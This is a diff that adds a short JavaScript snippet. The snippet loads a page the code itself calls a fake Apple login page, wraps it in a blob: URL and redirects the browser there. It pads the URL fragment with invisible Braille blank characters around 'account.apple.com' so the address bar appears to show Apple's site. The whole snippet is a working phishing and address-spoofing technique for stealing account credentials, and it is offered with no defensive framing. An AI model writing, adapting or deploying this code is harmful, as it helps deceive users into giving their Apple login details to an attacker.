@@ -1,0 +1,19 @@
+<script>
+
+// Payload
+payload='\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800account.apple.com\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800';
+
+// fetch fake login page and start
+fetch('/fakeapple.html').then(r => r.text()).then(h => {htmlContent = h;
+
+            // Create a blob with HTML content of a fake login page
+            const blob = new Blob([htmlContent], { type: 'text/html' });
+
+            // Generate a URL for the blob
+            const url = URL.createObjectURL(blob);
+
+            // Redirect top window to blob: URI
+            location=url+'#'+payload;
+
+});
+</script>
